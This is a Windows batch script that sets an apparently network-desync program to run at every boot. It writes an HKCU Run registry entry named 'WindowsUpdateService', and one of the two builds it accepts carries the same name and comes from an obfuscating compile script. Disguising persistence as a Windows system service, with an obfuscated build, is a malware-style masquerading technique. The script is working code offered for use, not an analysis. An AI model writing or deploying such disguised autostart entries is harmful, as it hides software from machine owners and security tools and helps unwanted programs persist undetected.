@echo off
chcp 65001 >nul
cd /d "%~dp0"

echo ========================================
echo   SETUP AUTO-START - DESYNC
echo ========================================
echo.

REM Check if compiled exe exists
if not exist "multiplicity_jitter_WITH_DESYNC.exe" (
    if not exist "WindowsUpdateService.exe" (
        echo ERROR: No compiled exe found!
        echo Please run compile_DESYNC.bat or compile_DESYNC_obfuscate.bat first.
        pause
        exit /b 1
    )
    set "EXE_NAME=WindowsUpdateService.exe"
) else (
    set "EXE_NAME=multiplicity_jitter_WITH_DESYNC.exe"
)

echo Found: %EXE_NAME%
echo.

REM Get full path
set "FULL_PATH=%~dp0%EXE_NAME%"

echo Adding to Windows startup...
echo.

REM Add to registry (Run on boot)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "\"%FULL_PATH%\"" /f

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    echo   AUTO-START ENABLED!
    echo ========================================
    echo.
    echo %EXE_NAME% will now run automatically on Windows startup.
    echo.
    echo To disable auto-start, run: remove_autostart_DESYNC.bat
    echo.
) else (
    echo.
    echo ERROR: Failed to add to startup!
    echo.
)

pause

